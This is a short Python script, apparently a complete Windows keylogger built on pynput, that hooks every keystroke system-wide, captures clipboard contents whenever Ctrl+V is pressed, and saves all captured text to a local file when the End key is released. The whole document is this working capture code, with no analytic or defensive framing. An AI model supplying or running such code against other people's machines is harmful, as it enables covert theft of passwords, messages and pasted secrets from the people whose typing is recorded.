from pynput import keyboard
import ctypes
import pyperclip

text = []


def on_activate_v():
    copied_text = pyperclip.paste()
    text.append(copied_text)
    print(repr(copied_text))


def caps_lock():
    # 0x14 is virtual key code of caps lock button, it returns 1 when caps lock is in opened state
    return ctypes.windll.user32.GetKeyState(0x14) & 1


def on_press(key):
    caps_state = caps_lock()

    try:
        char = key.char
        if caps_state:
            text.append(char.casefold().upper())
        else:
            text.append(char)

    except AttributeError:
        if key == keyboard.Key.backspace:
            if text:
                text.pop()
        elif key == keyboard.Key.enter:
            text.append("\n")

        elif key == keyboard.Key.space:
            text.append(" ")
        elif key == keyboard.Key.tab:
            text.append("\t")

        elif key == keyboard.Key.caps_lock:
            pass
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.ctrl_l:
            pass
        elif key == keyboard.Key.end:
            pass
        else:
            text.append(" " + str(key) + " ")


def on_release(key):
    if key == keyboard.Key.end:
        return False


with keyboard.GlobalHotKeys({
    '<ctrl>+v': on_activate_v}) as h:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
with open("keyboard_entries.txt", "w") as file:
    file.write("".join(text))
